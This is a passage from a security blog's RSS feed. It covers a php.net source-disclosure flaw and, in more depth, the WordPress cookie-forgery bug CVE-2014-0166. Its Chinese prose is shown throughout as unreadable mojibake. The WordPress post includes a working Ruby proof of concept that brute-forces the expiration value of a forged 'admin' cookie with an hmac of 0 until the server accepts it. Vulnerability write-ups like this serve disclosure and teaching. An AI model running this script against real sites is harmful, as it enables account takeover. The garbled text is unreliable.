&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_00_1337day.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_00_1337day.png&quot; alt=&quot;1337day ÊºèÊ¥û‰∫§ÊòìÁ∂≤Á´ô&quot; title=&quot;1337day ÊºèÊ¥û‰∫§ÊòìÁ∂≤Á´ô&quot; /&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÂèØ‰ª•ÁúãÂà∞ÈÄôÂÄãÂº±ÈªûÊòØ‰∏çÂÖ¨ÈñãÁöÑÔºåÊÉ≥Ë¶ÅÁü•ÈÅìÂÖßÂÆπÁöÑË©±Ë¶ÅÊîØ‰ªò 82 ÁæéÂÖÉÁõ∏Áï∂ÊñºÊñ∞Âè∞Âπ£ 3500 ÂÖÉÂë¢ÔºÅÂú®Âº∑ÁÉàÁöÑÂ•ΩÂ•áÂøÉÂ±à‰Ωø‰πã‰∏ãÔºåËá™Â∑±ÊâìÈñãÂ∑•ÂÖ∑‰æÜÊâæÁúãÁúãÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_01_source_code.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_01_source_code.png&quot; alt=&quot;PHP ÂÆòÊñπÁ∂≤Á´ôÂéüÂßãÁ¢º&quot; title=&quot;PHP ÂÆòÊñπÁ∂≤Á´ôÂéüÂßãÁ¢º&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÈÄèÈÅéÁ∞°ÂñÆÁöÑÂàÜÊûêÂíå‰∏ÄÈªûÈªûÈÅãÊ∞£ÔºåÊâæÂà∞‰∫Ü „Äå&lt;a href=&quot;http://www.php.net/cached.php&quot;&gt;http://www.php.net/cached.php&lt;/a&gt;„Äç ÈÄôÈöªÁ®ãÂºèÔºåÁôºÁèæÂÆÉÂÇ≥ÂÖ•‰∫Ü„Äåt„ÄçÂíå„Äåf„ÄçÈÄôÂÖ©ÂÄãÂèÉÊï∏„ÄÇ„Äåt„ÄçÁõ¥Ë¶∫‰∏äÂ∞±ÊòØÂÄã rand Êï∏ÂÄºÔºåËÄå„Äåf„ÄçÊáâË©≤Â∞±ÊòØÊ™îÊ°à‰ΩçÁΩÆ‰∫Ü„ÄÇÈÄôÊôÇÂÄôÂ∞ç f ÂèÉÊï∏Â∞èÂ∞è‰øÆÊîπ‰∏Ä‰∏ãÔºåÁ•ûÂ•áÁöÑ‰∫ãÊÉÖÁôºÁîü‰∫ÜÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_02_cached.php.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_02_cached.php.png&quot; alt=&quot;cached.php ËÆÄÂèñÂéüÂßãÁ¢º&quot; title=&quot;cached.php ËÆÄÂèñÂéüÂßãÁ¢º&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;index.php ÁöÑÂéüÂßãÁ¢ºË¢´ÂÆåÊï¥ÁöÑËÆÄÂá∫‰æÜÔºåÁï∂ÁÑ∂‰πüË¶Å‰æÜÁúã‰∏Ä‰∏ã cached.php ÊòØÊÄéÈ∫ºÂØ´ÁöÑÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_03_cached.php_view_source.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_03_cached.php_view_source.png&quot; alt=&quot;cached.php Ê™¢Ë¶ñÂéüÂßãÁ¢º&quot; title=&quot;cached.php Ê™¢Ë¶ñÂéüÂßãÁ¢º&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÂèØ‰ª•ÁúãÂà∞Ê≠§Ëôï‰∏¶Êú™Â∞ç $_GET[‚Äúf‚Äù] ÈÄ≤Ë°åÊ™¢Êü•ÔºåÊâÄ‰ª•‰øÆÊîπ‰∫Ü $_GET[‚Äúf‚Äù] ÂæåÔºåËàá $abs ÁµÑÂêàÂÆåÔºåÊúÄÂæåÂ∞±Áõ¥Êé•‰∏üÂÖ• readfile ËÆÄÂèñÊ™îÊ°à„ÄÇÊØîËºÉÂÄºÂæóÁ†îÁ©∂ÁöÑÊòØÈÄôÈÇä‰ΩøÁî®‰∫Ü realpath Ëàá strncmp ‰æÜÊØîËºÉ f Âèä DOCUMENT_ROOTÔºåÁ¢∫‰øù $abs Âè™ËÉΩÂú®Á∂≤Á´ôÁõÆÈåÑ‰πã‰∏ãÔºåÊâÄ‰ª•ÁÑ°Ê≥ï‰ΩøÁî® ../../ (&lt;a href=&quot;https://www.owasp.org/index.php/Path_Traversal&quot;&gt;Path Traversal&lt;/a&gt;) ÁöÑÊñπÂºèË∑≥ËÑ´ÁõÆÈåÑÈÄ≤Ë°åÊõ¥ÈÄ≤‰∏ÄÊ≠•ÁöÑÊª≤ÈÄè„ÄÇ&lt;/p&gt;

&lt;p&gt;ÊúÄÂæåÊàëÂÄëÂ∞áÊ≠§ÁôºÁèæÂõûÂ†±Áµ¶ security@php.net ÔºåÂæóÂà∞ÁöÑÂõûÊáâÊòØ‰ªñÂÄëÊòØ„ÄåÊïÖÊÑèÁöÑ (intentional)„Äç„ÄÇ‰∏îÂæå‰æÜ‰πüÁü•ÈÅì PHP ÂÆòÁ∂≤ÊòØÈñãÊîæÂéüÂßãÁ¢ºÔºàOpen SourceÔºâÁöÑÔºåÂèØ‰ª•Âà∞ &lt;a href=&quot;http://git.php.net/?p=web/php.git;a=tree&quot;&gt;http://git.php.net/?p=web/php.git;a=tree&lt;/a&gt; ‰∏ãËºâÊï¥ÂÄãÂÆòÁ∂≤ÁöÑÂéüÂßãÁ¢º„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_04_php_team_response.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140424/php.net_insecure_direct_object_reference_04_php_team_response.png&quot; alt=&quot;PHP.NET ÂÆòÁ∂≤ÂúòÈöäÂõûÊáâ&quot; title=&quot;PHP.NET ÂÆòÁ∂≤ÂúòÈöäÂõûÊáâ&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÈõñÁÑ∂Âú®ÈÄôÂÄãÊ°à‰æã‰∏≠‰∏¶Ê≤íÊúâÈÄ†ÊàêÂØ¶Ë≥™‰∏äÁöÑÂç±ÂÆ≥ÔºåÊ≤íÊúâÂ∏≥Ëôü„ÄÅÂØÜÁ¢º„ÄÅÁ≥ªÁµ±Ë®≠ÂÆöÁ≠âÊ©üÊïèË≥áÊñôÔºå‰ΩÜËã•ÊääÊ≠§Á®ÆÂØ´Ê≥ïÁî®Âú®ÂÖ∂‰ªñÂú∞ÊñπÔºåÂâáÂèØËÉΩÈÄ†ÊàêÂæàÂ§ßÁöÑË≥áÂÆâÈ¢®Èö™„ÄÇÂ∞±ÈÄ£ PHP ÂÆòÊñπÁ∂≤Á´ôÈÉΩÊúâÈÄôÊ®£ÁöÑÂ§±Ë™§ÔºåË∫´ÁÇ∫ÈñãÁôº‰∫∫Âì°ÁöÑ‰Ω†ÂÄëÊõ¥‰∏çÂèØ‰∏çÊÖéÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/04/24/php.net-insecure-direct-object-reference/</link>
                <guid>https://devco.re/blog/2014/04/24/php.net-insecure-direct-object-reference</guid>
                <pubDate>Thu, 24 Apr 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>CVE-2014-0166 WordPress ÂÅΩÈÄ† Cookie Âº±Èªû</title>
                <description>&lt;h3 id=&quot;ÂâçË®Ä&quot;&gt;ÂâçË®Ä&lt;/h3&gt;

&lt;p&gt;Âú®‰∏ÄÈô£ OpenSSL Heartbleed Ê∑òÈáëÊΩÆ‰∏≠ÔºåÂèàÊúâ‰∏ÄÂÄãÊäÄË°ìÈñÄÊ™ª‰Ωé„ÄÅÂæåÊûúÂö¥Èáç„ÄÅ‰πüÂêåÊ®£ÈúÄË¶Å‰∫õÈÅãÊ∞£ÁöÑÊºèÊ¥ûË¢´Êè≠ÁôºÔºç&lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0166&quot;&gt;CVE-2014-0166&lt;/a&gt;„ÄÇCVE-2014-0166 ÊòØ WordPress ‰∏äÈù¢È©óË≠âÁôªÂÖ• cookie ÁöÑÂº±ÈªûÔºåÊîªÊìäËÄÖÂèØ‰ª•Êö¥ÂäõÂÅΩÈÄ†Âá∫ÂêàÊ≥ï cookieÔºåËóâÊ≠§Áç≤Âæó WordPress ÊúÄÈ´òÊ¨äÈôêÔºåÈÄ≤ËÄåÊãøÂà∞ shell ÂèñÂæóÁ≥ªÁµ±Êìç‰ΩúÊ¨ä„ÄÇ
ËÆìÊàëÂÄë‰æÜÂàÜÊûê‰∏Ä‰∏ãÈÄôÊ¨°ÁöÑÂº±ÈªûÊòØÁôºÁîü‰∫Ü‰ªÄÈ∫º‰∫ãÂêßÔºÅ&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;Ëß£Êûê&quot;&gt;Ëß£Êûê&lt;/h3&gt;

&lt;p&gt;ÈÄôÊ¨°Âá∫ÂïèÈ°åÁöÑÁ®ãÂºèÁ¢ºÂú®&lt;a href=&quot;https://github.com/WordPress/WordPress/blob/684145ca8101e9ba5d9b4516709121fbe0fb9aee/wp-includes/pluggable.php#L650&quot;&gt;ÈÄôÈÇä&lt;/a&gt;ÔºåÈóúÈçµÁ®ãÂºèÁ¢ºÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;wp_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pass_frag&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;|&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$expiration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$scheme&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash_hmac&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;md5&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;|&apos;&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$expiration&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$hmac&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$hash&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;cd&quot;&gt;/**
   * Fires if a bad authentication cookie hash is encountered.
   *
   * @since 2.7.0
   *
   * @param array $cookie_elements An array of data for the authentication cookie.
   */&lt;/span&gt;
  &lt;span class=&quot;nf&quot;&gt;do_action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;auth_cookie_bad_hash&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cookie_elements&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ÂïèÈ°å‰∏ªË¶ÅÁôºÁîüÂú®ÊØîËºÉÈÅãÁÆóÂ≠ê != ‰∏äÈù¢Ôºå!= ÈÅãÁÆóÂ≠êÊòØ non-strictÔºåÊúÉÂú®ÊØîËºÉÂâçÂÖàÂÅöÂûãÊÖãËΩâÊèõÔºåÊâÄ‰ª•‰∏ãÈù¢Áúã‰ººÊáâË©≤ÊòØÂõûÂÇ≥ true ÁöÑ‰æãÂ≠êÔºåÂÖ®ÈÉ®ÈÉΩÈ°ØÁ§∫ÁÇ∫ falseÔºåÁ¥∞ÁØÄË´ãÂèÉÈñ±&lt;a href=&quot;http://www.php.net/manual/en/language.operators.comparison.php&quot;&gt;ÂÆòÊñπÊâãÂÜä&lt;/a&gt;„ÄÇ&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 0 != 0 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;01&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 1 != 1 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;10&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1e1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 10 != 10 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;1e2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 100 != 100 -&amp;gt; false&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;var_dump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0e10123456789012345678901234567890&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// 0 != 0 -&amp;gt; false&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;ÈÄ≤ÂÖ•Ê≠£È°åÔºåWordPress Ë™çË≠âË∫´ÂàÜÁî®ÁöÑ cookie ÂÖßÂÆπÊòØÈÄôÊ®£ÁöÑÔºö„Äéusername|expiration|hmac„Äè„ÄÇ&lt;br /&gt;
username ÊòØ‰ΩøÁî®ËÄÖÂêçÁ®±Ôºå&lt;br /&gt;
expiration ÊòØÊúâÊïàÊúüÈôê(timestamp)Ôºå&lt;br /&gt;
hmac ÂÄºÁî®‰æÜÈ©óË≠â cookie ÊòØÂê¶ÂêàÊ≥ï„ÄÇ&lt;br /&gt;
Âæû‰∏äÈù¢Á®ãÂºèÁ¢ºÂèØ‰ª•ÁúãÂà∞Ôºåhmac ÁöÑÁÆóÊ≥ïÊòØÁ∂ìÈÅé username„ÄÅpass_frag„ÄÅexpiration„ÄÅkey Á∂úÂêàÂæóÂá∫„ÄÇËã•ÊúâËæ¶Ê≥ïÊéßÂà∂ cookie ‰∏≠ÁöÑ hmac ‰Ωø‰º∫ÊúçÂô®Ë™çÁÇ∫Ë©≤ cookie ÂêàÊ≥ïÔºåÂ∞±ÂèØ‰ª•ÊàêÂäüÂÅΩÈÄ†Êàê username„ÄÇ&lt;/p&gt;

&lt;p&gt;Âà©Áî®Á®çÊó©ÊèêÂà∞ÁöÑÊØîËºÉÈÅãÁÆóÂ≠êÂïèÈ°åÔºåËã•ÊàëÂÄëËÆì cookie ‰∏≠ÁöÑ hmac ÂÄºÁÇ∫ 0ÔºåÂæàÊúâÂèØËÉΩËÆìÂà§Êñ∑ÂºèËÆäÊàê‰∏ãÈù¢ÈÄôÊ®£Ôºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;c1&quot;&gt;//if ( $hmac != $hash ) {&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;0e10123456789012345678901234567890&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;do_action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;auth_cookie_bad_hash&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$cookie_elements&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Â¶ÇÊ≠§‰æøÂèØ‰ª•ÈÄöÈÅéÈ©óË≠âÔºåÊàêÂäüÂÅΩÈÄ†ÂêàÊ≥ï cookie„ÄÇ&lt;br /&gt;
ËÄåÁÇ∫‰∫ÜËÆì $hash == 0ÔºåÂèØ‰ª•‰∏çÊñ∑ÊîπËÆä cookie ‰∏≠ÁöÑ expirationÔºåËÆìÁî¢ÁîüÁöÑ MD5 ÂÄº($hash)Á∂ìÈÅéÂûãÊÖãËΩâÊèõÂæåÂâõÂ•ΩËÆäÊàê 0„ÄÇ&lt;br /&gt;
Á¨¶Âêà $hash == 0 ÁöÑ MD5 $hash ÂÄºÊúâ 
0eXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX„ÄÅ00eXXXXXXXXXXXXXXXXXXXXXXXXXXXXX‚Ä¶.000000000000000000000000000eX„ÄÅ00000000000000000000000000000 (X = 0,1,2,3,4,5,6,7,8,9)&lt;/p&gt;

&lt;p&gt;ÊïÖÂá∫Áèæ $hash == 0 ÁöÑÊ©üÁéáÁÇ∫ Sum(10^n,n=0,30)/16^32 = 3.265262085617465e-09&lt;/p&gt;

&lt;p&gt;ÊØèÊ¨°ÂÅΩÈÄ†ÁöÑÊàêÂäüÊ©üÁéáÁ¥ÑÁÇ∫‰∏âÂÑÑÂàÜ‰πã‰∏ÄÔºå‰∏¶‰∏çÊúÉÂæàÈ´òÔºå‰ΩÜÂ∑≤Á∂ìË∂≥Â§†Âú®‰∏ÄÂÄãÊúàÂÖßÊãøÂà∞ÊúÄÈ´òÊ¨äÈôêÔºåËÄå‰∏îÊâÄËÄóÊàêÊú¨‰∏¶‰∏çÊúÉÂæàÈ´ò„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;ÂØ¶È©ó&quot;&gt;ÂØ¶È©ó&lt;/h3&gt;

&lt;p&gt;ÁÇ∫‰∫ÜÈ©óË≠âÊ≠§ÊñπÊ≥ï‰πãÂèØË°åÊÄßÔºåÊàëÂÄëÊû∂Ë®≠‰∫Ü &lt;a href=&quot;http://tw.WordPress.org/WordPress-3.8.1-zh_TW.zip&quot;&gt;WordPress 3.8.1&lt;/a&gt; Áí∞Â¢É„ÄÇ‰∏¶‰∏îÂØ´Á®ãÂºèÂ∞áÁôªÂÖ• cookie ‰∏≠ÁöÑ hmac Ë®≠ÁÇ∫ 0Ôºå‰∏çÊñ∑Ë™øÊï¥ expiration ÂÄºÊ∏¨Ë©¶ÊòØÂê¶Â∑≤Á∂ìÁôªÂÖ•ÔºåÁ®ãÂºèÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;httpclient&apos;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;http&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;HTTPClient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;cookie_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;WordPress_logged_in_de5be3cf9fcea023a1303527e10ea67a&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;timestamp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;800000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;http://domain.my/WordPress/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Cookie&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cookie_name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;=admin%7C&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%7C0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;include?&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;logout&apos;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;admin%7C&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;%7C0&quot;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;blockquote&gt;
  &lt;p&gt;Ë®ªÔºöÊ≠§Á®ãÂºèÁÇ∫ POCÔºåË´ãËá™Ë°åË™øÊï¥ÁÇ∫Â§öÂü∑Ë°åÁ∑íÁâàÊú¨Ôºå‰∏çÁÑ∂ÈÄüÂ∫¶ÊúÉÂæàÊÖ¢„ÄÇ&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Á∂ìÈÅé‰∏ÄÊÆµÈï∑ÊôÇÈñìÁöÑÁ≠âÂæÖÔºåÂæóÂà∞ÁöÑÁµêÊûúÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140416/iTerm.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140416/iTerm.png&quot; alt=&quot;Êö¥ÂäõÂÅΩÈÄ† cookieÔºåÁõ¥Âà∞ÊàêÂäüÁôªÂÖ•&quot; title=&quot;Êö¥ÂäõÂÅΩÈÄ† cookieÔºåÁõ¥Âà∞ÊàêÂäüÁôªÂÖ•&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ÂæóÁü•Áï∂ cookie ‰∏≠ÁöÑ username ÁÇ∫ admin ‰∏î expiration ÂÄºÁÇ∫ 1421818232 ÊôÇÔºå‰º∫ÊúçÂô®ÁÆóÂá∫‰æÜÁöÑ hmac Á∂ìÈÅéÂûãÊÖãËΩâÊèõÊúÉËÆäÊàê 0„ÄÇÊàëÂÄëÂ∞áÊ∏¨Ë©¶ÊàêÂäüÁöÑ cookie ÂÄºÔºö admin%7C1421818232%7C0 Ë≤ºÂà∞ÁÄèË¶ΩÂô®‰∏ä„ÄÇÊàêÂäüËÆäÊàê admin Â¶Ç‰∏ãÂúñÔºåÂØ¶È©óÊàêÂäüÔºÅ&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140416/Mantra1.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140416/Mantra1.png&quot; alt=&quot;Âà©Áî®ÂÅΩÈÄ†ÁöÑ cookie ÁôªÂÖ• WordPress&quot; title=&quot;Âà©Áî®ÂÅΩÈÄ†ÁöÑ cookie ÁôªÂÖ• WordPress&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
